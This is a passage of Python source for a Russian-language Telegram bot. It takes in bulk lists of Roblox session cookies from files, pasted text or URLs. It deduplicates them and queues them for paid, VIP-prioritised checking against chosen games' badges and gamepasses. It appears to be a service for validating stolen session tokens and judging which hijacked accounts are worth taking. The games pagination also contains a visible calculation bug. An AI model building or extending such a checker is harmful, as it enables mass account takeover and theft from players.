            f"<code>{str(e)}</code>\n\n"
            f"🔄 <b>Решение:</b>\n"
            f"1. Проверьте формат печеньки\n"
            f"2. Убедитесь, что это валидная печенька\n"
            f"3. Попробуйте еще раз\n\n"
            f"<i>Если ошибка повторяется, обратитесь в поддержку.</i>"
        )
        await message.answer(error_message, parse_mode=ParseMode.HTML)
        logging.error(f"Ошибка обработки сообщения с печенькой: {e}")
    finally:
        await state.clear()

def process_cookie_file(file_path: str):
    """Валидирует куки из файла"""
    valid_cookies = set()
    invalid_lines = 0
    total_lines = 0
    duplicates = 0
    
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            total_lines += 1
            line = line.strip()
            if '_|WARNING:-DO-NOT-SHARE-THIS.' in line:
                try:
                    cookie = line.split('_|WARNING:-DO-NOT-SHARE-THIS.')[1].split()[0]
                    full_cookie = f'_|WARNING:-DO-NOT-SHARE-THIS.{cookie}'
                    if full_cookie in valid_cookies:
                        duplicates += 1
                    else:
                        valid_cookies.add(full_cookie)
                except:
                    invalid_lines += 1
            else:
                invalid_lines += 1
    
    return {
        'cookies': list(valid_cookies),
        'total_lines': total_lines,
        'invalid_lines': invalid_lines,
        'duplicates': duplicates
    }

def validate_cookies_from_bytes(content: bytes) -> dict:
    """Валидирует куки из байтов БЕЗ сохранения файла"""
    valid_cookies = set()
    invalid_lines = 0
    total_lines = 0
    duplicates = 0
    
    try:
        text = content.decode('utf-8', errors='ignore')
        lines = text.split('\n')
        
        for line in lines:
            total_lines += 1
            line = line.strip()
            if not line:
                continue
            
            if '_|WARNING:-DO-NOT-SHARE-THIS.' in line:
                try:
                    cookie = line.split('_|WARNING:-DO-NOT-SHARE-THIS.')[1].split()[0]
                    full_cookie = f'_|WARNING:-DO-NOT-SHARE-THIS.{cookie}'
                    if full_cookie in valid_cookies:
                        duplicates += 1
                    else:
                        valid_cookies.add(full_cookie)
                except:
                    invalid_lines += 1
            else:
                invalid_lines += 1
    except Exception as e:
        logging.error(f"Ошибка валидации кук: {e}")
        return None
    
    return {
        'cookies': list(valid_cookies),
        'total_lines': total_lines,
        'invalid_lines': invalid_lines,
        'duplicates': duplicates
    }

def extract_cookies_from_url(url: str) -> list:
    """Извлекает куки из URL"""
    import re
    cookies = []
    
    # Паттерн для куки Roblox: _|WARNING:-DO-NOT-SHARE-THIS.cookie_value
    pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS\.[a-zA-Z0-9_\-]+'
    matches = re.findall(pattern, url)
    
    for match in matches:
        cookies.append(match)
    
    return cookies

def process_urls_input(text: str) -> dict:
    """Обрабатывает входной текст с URL или ссылками"""
    import re
    valid_cookies = set()
    invalid_lines = 0
    total_lines = 0
    duplicates = 0
    
    lines = text.split('\n')
    
    for line in lines:
        total_lines += 1
        line = line.strip()
        if not line:
            continue
        
        # Проверяем если это ссылка (http/https)
        if line.startswith('http://') or line.startswith('https://'):
            cookies = extract_cookies_from_url(line)
            if cookies:
                for cookie in cookies:
                    if cookie in valid_cookies:
                        duplicates += 1
                    else:
                        valid_cookies.add(cookie)
            else:
                invalid_lines += 1
        # Проверяем если это уже готовая кука
        elif '_|WARNING:-DO-NOT-SHARE-THIS.' in line:
            try:
                cookie = line.split('_|WARNING:-DO-NOT-SHARE-THIS.')[1].split()[0]
                full_cookie = f'_|WARNING:-DO-NOT-SHARE-THIS.{cookie}'
                if full_cookie in valid_cookies:
                    duplicates += 1
                else:
                    valid_cookies.add(full_cookie)
            except:
                invalid_lines += 1
        else:
            invalid_lines += 1
    
    return {
        'cookies': list(valid_cookies),
        'total_lines': total_lines,
        'invalid_lines': invalid_lines,
        'duplicates': duplicates
    }

@router.message(Form.file)
async def process_file(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await bot.send_sticker(message.chat.id, STICKERS['ban'])
        await message.answer(f"🚫 <b>Вы заблокированы.</b>\nПричина: {reason}", parse_mode=ParseMode.HTML)
        return
    
    file_path = None
    file_info = None
    msg = None
    
    try:
        # Обработка файла
        if message.document:
            if not message.document.file_name.endswith('.txt'):
                await bot.send_sticker(message.chat.id, STICKERS['error'])
                await message.answer("❌ <b>Неверный формат файла.</b>\nОтправьте текстовый файл (.txt).", parse_mode=ParseMode.HTML)
                return

            file_id = message.document.file_id
            
            msg = await message.answer("🔍 <b>Проверяю формат файла...</b>\n<i>Валидирую куки перед загрузкой.</i>", parse_mode=ParseMode.HTML)
            
            # ОПТИМИЗАЦИЯ: Сначала скачиваем и валидируем в памяти
            try:
                file_bytes = await bot.download(file_id)
                file_info = validate_cookies_from_bytes(file_bytes)
                
                if not file_info:
                    await bot.send_sticker(message.chat.id, STICKERS['error'])
                    await msg.edit_text(
                        f"❌ <b>ОШИБКА ВАЛИДАЦИИ</b>\n"
                        f"\n"
                        f"🚫 <b>Не удалось прочитать файл.</b>\n\n"
                        f"<i>Проверьте кодировку файла (UTF-8).</i>",
                        parse_mode=ParseMode.HTML
                    )
                    return
                
                # Если валидация прошла - сохраняем файл
                if file_info['cookies']:
                    file_name = f"{random.randint(100000, 999999)}.txt"
                    file_path = f"{COOKIE_FILES_DIR}{file_name}"
                    with open(file_path, 'wb') as f:
                        f.write(file_bytes)
                    
            except Exception as e:
                logging.error(f"Ошибка скачивания файла: {e}")
                await bot.send_sticker(message.chat.id, STICKERS['error'])
                await msg.edit_text(
                    f"❌ <b>ОШИБКА ЗАГРУЗКИ</b>\n"
                    f"\n"
                    f"📥 <b>Не удалось скачать файл.</b>\n"
                    f"<code>{str(e)[:50]}</code>\n\n"
                    f"<i>Попробуйте еще раз.</i>",
                    parse_mode=ParseMode.HTML
                )
                return
        
        # Обработка текста из сообщения
        elif message.text:
            cookies_text = message.text.strip()
            if not cookies_text:
                await message.answer(
                    f"❌ <b>ОШИБКА</b>\n\n"
                    f"📤 <b>Пожалуйста, отправьте куки в виде текста или файла</b>",
                    parse_mode=ParseMode.HTML
                )
                return
            
            msg = await message.answer("⏳ <b>Обрабатываю куки...</b>", parse_mode=ParseMode.HTML)
            
            # Разбираем куки из текста (с поддержкой URL и обычных кук)
            file_info = process_urls_input(cookies_text)
        else:
            await message.answer(
                f"❌ <b>ОШИБКА</b>\n\n"
                f"📤 <b>Пожалуйста, отправьте файл с куками или куки текстом</b>\n\n"
                f"<i>Поддерживаемые форматы: .txt или прямой текст</i>",
                parse_mode=ParseMode.HTML
            )
            return
        
        if not file_info or not file_info['cookies']:
            await bot.send_sticker(message.chat.id, STICKERS['error'])
            await msg.edit_text(
                f"❌ <b>ПРОВЕРКА ФАЙЛА</b>\n"
                f"\n"
                f"🚫 <b>В источнике не найдено валидных куки.</b>\n\n"
                f"<i>Проверьте формат файла и попробуйте снова.</i>",
                parse_mode=ParseMode.HTML
            )
            return
        
        # ПЛАТНАЯ СИСТЕМА: Проверка лимита бесплатных проверок
        user_id = message.from_user.id
        used_bonus = False
        
        if not Database.can_use_free_check(user_id):
            # Проверяем есть ли бонусные проверки
            if Database.can_use_bonus_check(user_id):
                Database.use_bonus_check(user_id)
                used_bonus = True
            else:
                remaining = Database.get_checks_remaining(user_id)
                bonus = Database.get_user_config(user_id).get('bonus_checks', 0)
                await bot.send_sticker(message.chat.id, STICKERS['error'])
                await msg.edit_text(
                    f"❌ <b>ЛИМИТ БЕСПЛАТНЫХ ПРОВЕРОК</b>\n"
                    f"\n"
                    f"🚫 <b>Вы исчерпали лимит на день (5 проверок).</b>\n\n"
                    f"💰 <b>Опции:</b>\n"
                    f"├ 💳 Оплатить проверку\n"
                    f"├ 🎁 Бонусных проверок: <code>{bonus}</code>\n"
                    f"└ ⏰ Дождитесь завтрашнего дня\n\n"
                    f"<i>Реф программа: /ref</i>",
                    parse_mode=ParseMode.HTML
                )
                return
        
        # Добавляем с приоритетом (VIP = 0, обычные = 1)
        priority = Database.get_vip_priority(user_id)
        check_queue.put((priority, user_id, file_info, msg))
        
        # Если не используется бонус - увеличиваем счётчик ежедневных проверок
        if not used_bonus:
            Database.increment_daily_checks(user_id)
        
        checks_remaining = Database.get_checks_remaining(user_id)
        
        queue_size = check_queue.qsize()
        
        if current_checking is None:
            status_msg = (
                f"✅ <b>ФАЙЛ ДОБАВЛЕН В ОЧЕРЕДЬ</b>\n"
                f"\n"
                f"📊 <b>Статистика файла:</b>\n"
                f"├ Всего строк: <code>{file_info['total_lines']:,}</code>\n"
                f"├ Валидных куки: <code>{len(file_info['cookies']):,}</code>\n"
                f"├ Дубликатов: <code>{file_info['duplicates']}</code>\n"
                f"└ Невалидных строк: <code>{file_info['invalid_lines']}</code>\n\n"
                f"🎯 <b>Статус:</b> Первый в очереди\n"
                f"⏳ <b>Начало проверки:</b> Следующий\n"
                f"🎫 <b>Бесплатных проверок осталось:</b> <code>{checks_remaining}</code>/5\n\n"
                f"<i>Ожидайте начала проверки...</i>"
            )
        else:
            status_msg = (
                f"✅ <b>ФАЙЛ ДОБАВЛЕН В ОЧЕРЕДЬ</b>\n"
                f"\n"
                f"📊 <b>Статистика файла:</b>\n"
                f"├ Всего строк: <code>{file_info['total_lines']:,}</code>\n"
                f"├ Валидных куки: <code>{len(file_info['cookies']):,}</code>\n"
                f"├ Дубликатов: <code>{file_info['duplicates']}</code>\n"
                f"└ Невалидных строк: <code>{file_info['invalid_lines']}</code>\n\n"
                f"📍 <b>Позиция в очереди:</b> <code>{queue_size}</code>\n"
                f"⏱ <b>Примерное время ожидания:</b> <code>{queue_size * 2}-{queue_size * 5}</code> минут\n"
                f"🎫 <b>Бесплатных проверок осталось:</b> <code>{checks_remaining}</code>/5\n\n"
                f"<i>Статус очереди будет обновляться автоматически.</i>"
            )
        
        await msg.edit_text(status_msg, parse_mode=ParseMode.HTML)
        await notify_queue_update()
            
    except Exception as e:
        await bot.send_sticker(message.chat.id, STICKERS['error'])
        error_message = (
            f"❌ <b>ОШИБКА ОБРАБОТКИ ФАЙЛА</b>\n"
            f"\n"
            f"📝 <b>Произошла ошибка:</b>\n"
            f"<code>{str(e)[:100]}</code>\n\n"
            f"🔄 <b>Решение:</b>\n"
            f"1. Проверьте формат файла\n"
            f"2. Убедитесь, что это .txt файл\n"
            f"3. Попробуйте еще раз\n\n"
            f"<i>Если ошибка повторяется, обратитесь в поддержку.</i>"
        )
        await message.answer(error_message, parse_mode=ParseMode.HTML)
        logging.error(f"Ошибка обработки файла: {e}")
    finally:
        if file_path and os.path.exists(file_path):
            os.remove(file_path)
        await state.clear()

@router.message(F.text == "Profile")
async def show_profile(message: Message):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(f"🚫 Вы заблокированы. Причина: {reason}")
        return
    
    config = Database.get_user_config(message.from_user.id)
    ref_code = Database.get_or_create_referral_code(user_id)
    is_vip = Database.is_vip(user_id)
    referral_count = config.get('referral_count', 0)
    bonus_checks = config.get('bonus_checks', 0)
    
    await bot.send_sticker(message.chat.id, STICKERS['profile'])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 Реф ссылка", callback_data="show_referral")],
        [InlineKeyboardButton(text="👑 Купить VIP", callback_data="buy_vip")],
        [InlineKeyboardButton(text="📜 История проверок", callback_data="history")],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
    ])
    
    vip_status = "👑 VIP" if is_vip else "⭐ Обычный"
    
    await message.answer(
        f"👤 <b>ПРОФИЛЬ {message.from_user.id}</b>\n"
        f"\n"
        f"📋 <b>Основная информация:</b>\n"
        f"├ ID: <code>{message.from_user.id}</code>\n"
        f"├ Username: @{message.from_user.username}\n"
        f"└ Статус: {vip_status}\n\n"
        f"📅 <b>Активность:</b>\n"
        f"├ Регистрация: <code>{config['registration_date']}</code>\n"
        f"└ Последнее использование: <code>{config.get('last_activity', 'Неизвестно')}</code>\n\n"
        f"📊 <b>Статистика проверок:</b>\n"
        f"├ Всего проверок: <code>{config['cookie_check_count']}</code>\n"
        f"├ Проверено куки: <code>{config.get('total_checks', 0):,}</code>\n"
        f"├ Валидных: <code>{config.get('valid_cookies_found', 0):,}</code>\n"
        f"└ Невалидных: <code>{config.get('invalid_cookies_found', 0):,}</code>\n\n"
        f"🎁 <b>Реферальная программа:</b>\n"
        f"├ Рефералов: <code>{referral_count}</code>\n"
        f"├ Код: <code>{ref_code}</code>\n"
        f"└ Бонусных проверок: <code>{bonus_checks}</code>",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.callback_query(F.data == "set_badge")
async def set_badges(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_check_params")]
    ])
    
    await callback.message.answer(
        f"🏅 <b>НАСТРОЙКА БЕЙДЖЕЙ</b>\n"
        f"\n"
        f"📝 <b>Введите ID бейджей через запятую:</b>\n\n"
        f"<code>123456,789012,345678</code>\n\n"
        f"📋 <b>Пример:</b>\n"
        f"<code>123456789,987654321</code>\n\n"
        f"❌ <b>Чтобы отключить проверку бейджей, введите:</b>\n"
        f"<code>None</code>\n\n"
        f"<i>Бейджи будут проверяться у каждой печеньки.</i>\n"
        f"<a href='https://telegra.ph/Badges--Gamepases-01-23'>Ссылка</a> на актуальные геймпасы / бейджы\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
        reply_markup=keyboard
    )
    await state.set_state(Form.badge)

@router.message(Form.badge)
async def save_badges(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await bot.send_sticker(message.chat.id, STICKERS['ban'])
        await message.answer(f"🚫 <b>Вы заблокированы.</b>\nПричина: {reason}", parse_mode=ParseMode.HTML)
        return
    
    badges = message.text.strip()
    if badges.lower() == 'none':
        badges = []
        response_text = "❌ <b>Проверка бейджей отключена</b>"
    else:
        try:
            badges = [b.strip() for b in badges.split(',') if b.strip().isdigit()]
            if not badges:
                raise ValueError("Неверный формат")
            response_text = f"✅ <b>Бэйджи успешно обновлены!</b>\nДобавлено: <code>{len(badges)}</code>"
        except Exception as e:
            await bot.send_sticker(message.chat.id, STICKERS['error'])
            await message.answer(
                f"❌ <b>ОШИБКА ФОРМАТА</b>\n"
                f"\n"
                f"📝 <b>Введите ID бейджей через запятую:</b>\n"
                f"<code>123456,789012</code>\n\n"
                f"❌ <b>Или введите:</b>\n"
                f"<code>None</code> — для отключения",
                parse_mode=ParseMode.HTML
            )
            return
    
    Database.update_config(message.from_user.id, 'badges', badges)
    await message.answer(response_text, parse_mode=ParseMode.HTML)
    await state.clear()

@router.callback_query(F.data == "set_gp")
async def set_gamepasses(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_check_params")]
    ])
    await callback.message.answer(
        f"🎮 <b>НАСТРОЙКА ГЕЙМПАССОВ</b>\n"
        f"\n"
        f"📝 <b>Введите ID геймпассов через запятую:</b>\n\n"
        f"<code>123456,789012,345678</code>\n\n"
        f"📋 <b>Пример:</b>\n"
        f"<code>123456789,987654321</code>\n\n"
        f"❌ <b>Чтобы отключить проверку геймпассов, введите:</b>\n"
        f"<code>None</code>\n\n"
        f"<i>Геймпассы будут проверяться у каждой печеньки.</i>\n\n"
        f"<a href='https://telegra.ph/Badges--Gamepases-01-23'>Ссылка</a> на актуальные геймпасы / бейджы\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
        reply_markup=keyboard
    )
    await state.set_state(Form.gamepass)

@router.message(Form.gamepass)
async def save_gamepasses(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await bot.send_sticker(message.chat.id, STICKERS['ban'])
        await message.answer(f"🚫 <b>Вы заблокированы.</b>\nПричина: {reason}", parse_mode=ParseMode.HTML)
        return
    
    gamepasses = message.text.strip()
    user_path, _ = Database.register_user(user_id)
    if gamepasses.lower() == 'none':
        gamepasses = []
        response_text = "❌ <b>Проверка геймпассов отключена</b>"
    else:
        try:
            gamepasses = [gp.strip() for gp in gamepasses.split(',') if gp.strip().isdigit()]
            if not gamepasses:
                raise ValueError("Неверный формат")
            response_text = f"✅ <b>Геймпассы успешно обновлены!</b>\nДобавлено: <code>{len(gamepasses)}</code>"
        except Exception as e:
            await bot.send_sticker(message.chat.id, STICKERS['error'])
            await message.answer(
                f"❌ <b>ОШИБКА ФОРМАТА</b>\n"
                f"\n"
                f"📝 <b>Введите ID геймпассов через запятую:</b>\n"
                f"<code>123456,789012</code>\n\n"
                f"❌ <b>Или введите:</b>\n"
                f"<code>None</code> — для отключения",
                parse_mode=ParseMode.HTML
            )
            return
    
    Database.update_config(message.from_user.id, 'gamepasses', gamepasses)
    await message.answer(response_text, parse_mode=ParseMode.HTML)
    await state.clear()

# ============ Функции для выбора игр и их параметров ============

@router.callback_query(F.data == "check_games_menu")
async def check_games_menu(callback: CallbackQuery, state: FSMContext):
    """Показывает меню выбора одной игры для проверки"""
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    # Инициализируем page_index если его нет
    data = await state.get_data()
    page_index = data.get('games_page_index', 0)
    
    # Список всех игр
    all_games = [
        'NinetyNineNightsintheForest', 'AUniversalTime', 'AdoptMe', 'AnimeAdventures', 
        'AnimeDefenders', 'AnimeVanguards', 'BedWars', 'BeeSwarmSimulator', 'BladeBall', 
        'BloxFruits', 'BlueLockRivals', 'BubbleGumSimulatorINFINITY', 'CreaturesofSonaria', 
        'DaHood', 'DragonAdventures', 'Fisch', 'FiveNightsTD', 'GrandPieceOnline', 
        'GrowaGarden', 'Jailbreak', 'JujutsuInfinite', 'KingLegacy', 'MurderMystery2', 
        'PetSimulator99', 'PETSGO', 'ProjectSlayers', 'Rivals', 'RoyalHigh', 'SolsRNG', 
        'StealaBrainrot', 'ToiletTowerDefense', 'TowerDefenseSimulator', 'YourBizarreAdventure'
    ]
    
    # Пагинация (по 3 игры на странице)
    games_per_page = 3
    total_pages = (len(all_games) + games_per_page - 1) 
    page_index = page_index % total_pages
    
    start_idx = page_index * games_per_page
    end_idx = start_idx + games_per_page
    current_games = all_games[start_idx:end_idx]
    
    keyboard_rows = []
    
    # Добавляем игры на текущей странице
    for game_name in current_games:
        keyboard_rows.append([
            InlineKeyboardButton(text=game_name, callback_data=f"select_one_game_{game_name}")
        ])
    
    # Навигация
    nav_row = []
    if page_index > 0:
        nav_row.append(InlineKeyboardButton(text="⬅️", callback_data="games_page_prev"))
    if page_index < total_pages - 1:
        nav_row.append(InlineKeyboardButton(text="➡️", callback_data="games_page_next"))
    
    if nav_row:
        keyboard_rows.append(nav_row)
    
    keyboard_rows.append([InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_rows)
    
    await callback.message.edit_text(
        f"🎮 <b>ВЫБОР ИГРЫ ДЛЯ ПРОВЕРКИ</b>\n\n"
        f"Страница <code>{page_index + 1}/{total_pages}</code>\n\n"
        f"<i>Нажмите на игру для выбора</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    
    await state.set_data({'games_page_index': page_index})

@router.callback_query(F.data == "games_page_prev")
async def games_page_prev(callback: CallbackQuery, state: FSMContext):
    """Предыдущая страница игр"""
    data = await state.get_data()
    page_index = data.get('games_page_index', 0)
    page_index -= 1
    await state.update_data(games_page_index=page_index)
    await check_games_menu(callback, state)

@router.callback_query(F.data == "games_page_next")
async def games_page_next(callback: CallbackQuery, state: FSMContext):
    """Следующая страница игр"""
    data = await state.get_data()
    page_index = data.get('games_page_index', 0)
    page_index += 1
    await state.update_data(games_page_index=page_index)
    await check_games_menu(callback, state)

@router.callback_query(F.data.startswith("select_one_game_"))
async def select_game(callback: CallbackQuery, state: FSMContext):
    """Выбирает игру и переходит к параметрам"""
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    game_name = callback.data.replace("select_one_game_", "")
    await state.set_state(Form.select_game)
    await state.update_data(selected_game=game_name)
    await callback.answer(f"✅ Игра {game_name} выбрана")
    
    # Показываем параметры игры
    config = Database.get_user_config(user_id)
    game_badges = config.get(f'game_badges_{game_name}', [])
    game_gamepasses = config.get(f'game_gamepasses_{game_name}', [])
    
    keyboard_rows = [
        [InlineKeyboardButton(text="🏅 Выбрать бейджи", callback_data=f"select_game_badges_{game_name}")],
        [InlineKeyboardButton(text="🎮 Выбрать геймпассы", callback_data=f"select_game_gp_{game_name}")],
        [InlineKeyboardButton(text="🔍 Начать проверку", callback_data="start_game_check")],
        [InlineKeyboardButton(text="↩️ Назад", callback_data=f"select_game_params_{game_name}")]
    ]
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_rows)
    
    badges_info = f"<code>{len(game_badges)}</code> бейджей" if game_badges else "Не выбраны"
    gp_info = f"<code>{len(game_gamepasses)}</code> геймпассов" if game_gamepasses else "Не выбраны"
    
    await callback.message.edit_text(
        f"⚙️ <b>ПАРАМЕТРЫ ИГРЫ: {game_name}</b>\n\n"
        f"🏅 <b>Бейджи:</b> {badges_info}\n"
        f"🎮 <b>Геймпассы:</b> {gp_info}\n\n"
        f"<i>Выберите параметры для проверки</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.callback_query(F.data == "game_select_params")
async def game_select_params(callback: CallbackQuery, state: FSMContext):
    """Показывает меню выбора параметров для текущей игры"""
    data = await state.get_data()
    selected_game = data.get('selected_game')
    
    if not selected_game:
        await callback.answer("⚠️ Сначала выберите игру из списка", show_alert=True)
        return
    
    await callback.answer("ℹ️ Используйте кнопки ниже для выбора параметров")

@router.callback_query(F.data.startswith("select_game_badges_"))
async def select_game_badges(callback: CallbackQuery, state: FSMContext):
    """Показывает меню выбора бейджей для конкретной игры"""
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    # Получаем имя игры из callback
    game_name = callback.data.replace("select_game_badges_", "")
    await state.update_data(current_game_for_badges=game_name)
    
    # Показываем меню бейджей
    await show_badges_menu(callback, state, user_id, game_name)

async def show_badges_menu(callback: CallbackQuery, state: FSMContext, user_id: int, game_name: str):
    """Показывает меню выбора бейджей (helper функция)"""
    # Получаем бейджи для этой игры из класса
    game_class = globals().get(game_name)
    if not game_class or not hasattr(game_class, 'Badges'):
        await callback.answer("⚠️ Бейджи для этой игры не найдены", show_alert=True)
        return
    
    badges_list = game_class.Badges.listOfBadges if hasattr(game_class.Badges, 'listOfBadges') else []
    
    # Инициализируем page_index
    data = await state.get_data()
    page_index = data.get(f'badges_page_{game_name}', 0)
    
    config = Database.get_user_config(user_id)
    selected_badges = config.get(f'game_badges_{game_name}', [])
    
    # Пагинация (по 5 бейджей на странице)
    badges_per_page = 5
    total_pages = (len(badges_list) + badges_per_page - 1) // badges_per_page
    page_index = page_index % total_pages
    
    start_idx = page_index * badges_per_page
    end_idx = start_idx + badges_per_page
    current_badges = badges_list[start_idx:end_idx]
    
    keyboard_rows = []
    
    # Добавляем бейджи на текущей странице
    for idx, badge_id in enumerate(current_badges):
        # Сравниваем только с ID (badge_id[1]), а не со всем кортежем
        badge_id_num = badge_id[1] if isinstance(badge_id, (tuple, list)) else badge_id
        is_selected = "✅" if badge_id_num in selected_badges else "❌"
        actual_idx = start_idx + idx
        # Показываем только название бейджа (первый элемент tuple)
        badge_display = badge_id[0] if isinstance(badge_id, (tuple, list)) else badge_id
        keyboard_rows.append([
            InlineKeyboardButton(text=f"{is_selected} {badge_display}", callback_data=f"toggle_game_badge_{game_name}_{actual_idx}")
        ])
    
    # Навигация
    nav_row = []
    if page_index > 0:
        nav_row.append(InlineKeyboardButton(text="⬅️", callback_data=f"badges_page_prev_{game_name}"))
    if page_index < total_pages - 1:
        nav_row.append(InlineKeyboardButton(text="➡️", callback_data=f"badges_page_next_{game_name}"))
    
    if nav_row:
        keyboard_rows.append(nav_row)
    
    keyboard_rows.append([InlineKeyboardButton(text="↩️ Назад", callback_data=f"select_game_params_{game_name}")])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_rows)
    
    page_info = f"Страница <code>{page_index + 1}/{total_pages}</code>"
    if selected_badges:
        page_info += f" | Выбрано: <code>{len(selected_badges)}</code>"
    
    await callback.message.edit_text(
        f"🏅 <b>ВЫБОР БЕЙДЖЕЙ: {game_name}</b>\n\n"
        f"{page_info}\n\n"
        f"<i>Нажмите на бейдж чтобы выбрать/отменить</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    
    await state.update_data({f'badges_page_{game_name}': page_index})

@router.callback_query(F.data.startswith("badges_page_prev_"))
async def badges_page_prev(callback: CallbackQuery, state: FSMContext):
    """Предыдущая страница бейджей"""
    user_id = callback.from_user.id
    game_name = callback.data.replace("badges_page_prev_", "")
    data = await state.get_data()
    page_index = data.get(f'badges_page_{game_name}', 0)
    page_index -= 1
    await state.update_data({f'badges_page_{game_name}': page_index})
    await show_badges_menu(callback, state, user_id, game_name)

@router.callback_query(F.data.startswith("badges_page_next_"))
async def badges_page_next(callback: CallbackQuery, state: FSMContext):
    """Следующая страница бейджей"""
    user_id = callback.from_user.id
    game_name = callback.data.replace("badges_page_next_", "")
    data = await state.get_data()
    page_index = data.get(f'badges_page_{game_name}', 0)
    page_index += 1
    await state.update_data({f'badges_page_{game_name}': page_index})
    await show_badges_menu(callback, state, user_id, game_name)

@router.callback_query(F.data.startswith("toggle_game_badge_"))
async def toggle_game_badge(callback: CallbackQuery, state: FSMContext):
    """Выбирает/отменяет выбор бейджа для игры"""
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    # Парсим callback data: toggle_game_badge_{game_name}_{index}
    parts = callback.data.replace("toggle_game_badge_", "").rsplit('_', 1)
    game_name = parts[0]
    badge_index = int(parts[1])
    
    # Получаем список бейджей игры
    game_class = globals().get(game_name)
    if not game_class or not hasattr(game_class, 'Badges'):
        await callback.answer("⚠️ Бейджи не найдены", show_alert=True)
        return
    
    badges_list = game_class.Badges.listOfBadges if hasattr(game_class.Badges, 'listOfBadges') else []
    if badge_index >= len(badges_list):
        await callback.answer("⚠️ Бейдж не найден", show_alert=True)
        return
    
    badge_id = badges_list[badge_index]
    
    config = Database.get_user_config(user_id)
    selected_badges = config.get(f'game_badges_{game_name}', [])
    
    # Используем badge_id[1] (числовой ID) для сравнения и хранения
    badge_id_num = badge_id[1] if isinstance(badge_id, (tuple, list)) else badge_id
    
    if badge_id_num in selected_badges:
        selected_badges.remove(badge_id_num)
        await callback.answer(f"❌ Бейдж отменен")
    else:
        selected_badges.append(badge_id_num)
        await callback.answer(f"✅ Бейдж выбран")
    
    Database.update_config(user_id, f'game_badges_{game_name}', selected_badges)
    # Показываем меню бейджей
    await show_badges_menu(callback, state, user_id, game_name)

@router.callback_query(F.data.startswith("select_game_gp_"))
async def select_game_gamepasses(callback: CallbackQuery, state: FSMContext):
    """Показывает меню выбора геймпассов для конкретной игры"""
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    # Получаем имя игры из callback
    game_name = callback.data.replace("select_game_gp_", "")
    await state.update_data(current_game_for_gp=game_name)
    
    # Показываем меню геймпассов
    await show_gamepasses_menu(callback, state, user_id, game_name)

async def show_gamepasses_menu(callback: CallbackQuery, state: FSMContext, user_id: int, game_name: str):
    """Показывает меню выбора геймпассов (helper функция)"""
    # Получаем геймпассы для этой игры из класса
    game_class = globals().get(game_name)
    if not game_class or not hasattr(game_class, 'Gamepasses'):
        await callback.answer("⚠️ Геймпассы для этой игры не найдены", show_alert=True)
        return
    
    gamepasses_list = game_class.Gamepasses.listOfGamepasses if hasattr(game_class.Gamepasses, 'listOfGamepasses') else []
    
    # Инициализируем page_index
    data = await state.get_data()
    page_index = data.get(f'gp_page_{game_name}', 0)
    
    config = Database.get_user_config(user_id)
    selected_gp = config.get(f'game_gamepasses_{game_name}', [])
    
    # Пагинация (по 5 геймпассов на странице)
    gp_per_page = 5
    total_pages = (len(gamepasses_list) + gp_per_page - 1) // gp_per_page
    page_index = page_index % total_pages
    
    start_idx = page_index * gp_per_page
    end_idx = start_idx + gp_per_page
    current_gp = gamepasses_list[start_idx:end_idx]
    
    keyboard_rows = []
    
    # Добавляем геймпассы на текущей странице
    for idx, gp_id in enumerate(current_gp):
        # Сравниваем только с ID (gp_id[1]), а не со всем кортежем
        gp_id_num = gp_id[1] if isinstance(gp_id, (tuple, list)) else gp_id
        is_selected = "✅" if gp_id_num in selected_gp else "❌"
        actual_idx = start_idx + idx
